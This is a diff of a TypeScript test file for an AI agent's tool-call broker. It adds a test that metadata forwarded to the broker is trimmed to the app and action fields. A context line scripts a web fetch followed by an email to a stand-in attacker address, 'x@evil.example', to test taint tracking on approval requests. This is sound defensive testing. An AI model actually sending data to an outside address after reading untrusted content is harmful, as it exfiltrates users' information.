@@ -19,6 +19,23 @@ describe("connector rule and taint sources reach the broker (#71)", () => {
     });
   });
 
+  it("forwards only the string app and action of describeCall().meta", async () => {
+    const h = harness({
+      script: [call("c1", "computer.act", { app: "com.apple.Notes" }), say("Clicked.")],
+      policy: { bySideEffect: { write: "allow" } },
+    });
+    h.loop.registry.register({
+      spec: spec("computer.act", "write"),
+      execute: recorder().execute,
+      describeCall: () => ({
+        kind: "computer_action",
+        meta: { app: "com.apple.Notes", action: "click", extra: true } as never,
+      }),
+    });
+    await runTurn(h, "click it");
+    expect(h.broker.decisions[0]?.call.meta).toEqual({ app: "com.apple.Notes", action: "click" });
+  });
+
   it("a tainted approval request carries the turn's taint sources", async () => {
     const h = harness({
       script: [call("f1", "web.fetch", {}), call("s1", "email.send", { to: "x@evil.example" })],
